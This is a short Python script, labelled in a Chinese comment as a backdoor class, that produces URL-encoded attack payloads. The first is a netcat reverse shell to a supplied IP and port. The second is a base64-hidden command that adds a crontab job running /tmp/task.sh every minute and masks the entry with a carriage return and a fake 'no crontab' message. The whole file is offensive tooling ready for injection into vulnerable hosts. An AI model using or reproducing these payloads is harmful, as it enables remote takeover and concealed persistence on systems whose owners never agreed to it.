import base64
import urllib
from urllib import parse



#后门类
class Backdoor:
    payload1='nc ip port -e /bin/bash'
    payload2=''
    encoded_payload2="KGNyb250YWIrLWwlM2JwcmludGYrJTIyKisqKyorKisqKyUyZnRtcCUyZnRhc2suc2glM2IlNWNybm8rY3JvbnR3LXdhYitmb3IrJTYwd2hvYW1pJTYwKyUyNTEwMGMlNWNuJTIyKSU3Y2Nyb250YWIrLQ=="

    def __init__(self,ip,port):
        self.ip=ip
        self.port=port
        mid="nc "+self.ip+" "+self.port+" -e /bin/bash"
        Backdoor.payload1= urllib.parse.quote(mid)

        

    def get_payload1(self):
        return Backdoor.payload1
    
    def get_payload2(self):
        mid=base64.b64decode(Backdoor.encoded_payload2)
        Backdoor.payload2= mid.decode('utf-8')
        return Backdoor.payload2

if __name__ == "__main__":
    clz=Backdoor('192.168.225.157','2333')
    print(clz.get_payload1())
    print(clz.get_payload2())